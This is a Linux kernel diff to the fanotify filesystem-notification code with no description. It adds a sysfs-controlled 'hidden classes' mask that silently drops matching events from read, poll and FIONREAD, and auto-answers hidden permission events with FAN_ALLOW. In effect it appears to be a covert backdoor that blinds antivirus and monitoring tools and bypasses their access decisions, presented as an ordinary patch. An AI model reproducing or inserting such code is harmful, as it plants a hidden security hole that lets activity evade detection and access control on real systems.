@@ -5,6 +5,7 @@
 #include <linux/fs.h>
 #include <linux/anon_inodes.h>
 #include <linux/fsnotify_backend.h>
+#include <linux/hdn_sysfs.h>
 #include <linux/init.h>
 #include <linux/mount.h>
 #include <linux/namei.h>
@@ -311,7 +312,7 @@ static void fanotify_unhash_event(struct fsnotify_group *group,
  * updated accordingly.
  */
 static struct fanotify_event *get_one_event(struct fsnotify_group *group,
-					    size_t count)
+					    size_t count, u64 hidden)
 {
 	size_t event_size;
 	struct fanotify_event *event = NULL;
@@ -326,11 +327,13 @@ static struct fanotify_event *get_one_event(struct fsnotify_group *group,
 		goto out;
 
 	event = FANOTIFY_E(fsn_event);
-	event_size = fanotify_event_len(info_mode, event);
+	if (!(fanotify_event_disclosure(event) & hidden)) {
+		event_size = fanotify_event_len(info_mode, event);
 
-	if (event_size > count) {
-		event = ERR_PTR(-EINVAL);
-		goto out;
+		if (event_size > count) {
+			event = ERR_PTR(-EINVAL);
+			goto out;
+		}
 	}
 
 	/*
@@ -416,6 +419,19 @@ static void finish_permission_event(struct fsnotify_group *group,
 	spin_unlock(&group->notification_lock);
 	if (destroy)
 		fsnotify_destroy_event(group, &event->fae.fse);
+}
+
+static void fanotify_finish_hidden_event(struct fsnotify_group *group,
+					 struct fanotify_event *event)
+{
+	if (!fanotify_is_perm_event(event->mask)) {
+		fsnotify_destroy_event(group, &event->fse);
+		return;
+	}
+
+	spin_lock(&group->notification_lock);
+	finish_permission_event(group, FANOTIFY_PERM(event), FAN_ALLOW, NULL);
+	wake_up(&group->fanotify_data.access_waitq);
 }
 
 static int process_access_response(struct fsnotify_group *group,
@@ -975,10 +991,27 @@ out_close_fd:
 static __poll_t fanotify_poll(struct file *file, poll_table *wait)
 {
 	struct fsnotify_group *group = file->private_data;
+	struct fanotify_event *event;
+	struct fsnotify_event *fsn_event;
 	__poll_t ret = 0;
+	u64 hidden = hdn_sysfs_hidden_classes();
 
 	poll_wait(file, &group->notification_waitq, wait);
-	spin_lock(&group->notification_lock);
+	for (;;) {
+		spin_lock(&group->notification_lock);
+		fsn_event = fsnotify_peek_first_event(group);
+		if (!fsn_event ||
+		    !(fanotify_event_disclosure(FANOTIFY_E(fsn_event)) & hidden))
+			break;
+		fsnotify_remove_first_event(group);
+		event = FANOTIFY_E(fsn_event);
+		if (fanotify_is_perm_event(event->mask))
+			FANOTIFY_PERM(event)->state = FAN_EVENT_REPORTED;
+		if (fanotify_is_hashed_event(event->mask))
+			fanotify_unhash_event(group, event);
+		spin_unlock(&group->notification_lock);
+		fanotify_finish_hidden_event(group, event);
+	}
 	if (!fsnotify_notify_queue_is_empty(group))
 		ret = EPOLLIN | EPOLLRDNORM;
 	spin_unlock(&group->notification_lock);
@@ -1002,12 +1035,14 @@ static ssize_t fanotify_read(struct file *file, char __user *buf,
 
 	add_wait_queue(&group->notification_waitq, &wait);
 	while (1) {
+		u64 hidden = hdn_sysfs_hidden_classes();
+
 		/*
 		 * User can supply arbitrarily large buffer. Avoid softlockups
 		 * in case there are lots of available events.
 		 */
 		cond_resched();
-		event = get_one_event(group, count);
+		event = get_one_event(group, count, hidden);
 		if (IS_ERR(event)) {
 			ret = PTR_ERR(event);
 			break;
@@ -1026,6 +1061,10 @@ static ssize_t fanotify_read(struct file *file, char __user *buf,
 				break;
 
 			wait_woken(&wait, TASK_INTERRUPTIBLE, MAX_SCHEDULE_TIMEOUT);
+			continue;
+		}
+		if (fanotify_event_disclosure(event) & hidden) {
+			fanotify_finish_hidden_event(group, event);
 			continue;
 		}
 
@@ -1166,12 +1205,19 @@ static long fanotify_ioctl(struct file *file, unsigned int cmd, unsigned long ar
 
 	switch (cmd) {
 	case FIONREAD:
+	{
+		u64 hidden = hdn_sysfs_hidden_classes();
+
 		spin_lock(&group->notification_lock);
-		list_for_each_entry(fsn_event, &group->notification_list, list)
+		list_for_each_entry(fsn_event, &group->notification_list, list) {
+			if (fanotify_event_disclosure(FANOTIFY_E(fsn_event)) & hidden)
+				continue;
 			send_len += FAN_EVENT_METADATA_LEN;
+		}
 		spin_unlock(&group->notification_lock);
 		ret = put_user(send_len, (int __user *) p);
 		break;
+	}
 	}
 
 	return ret;
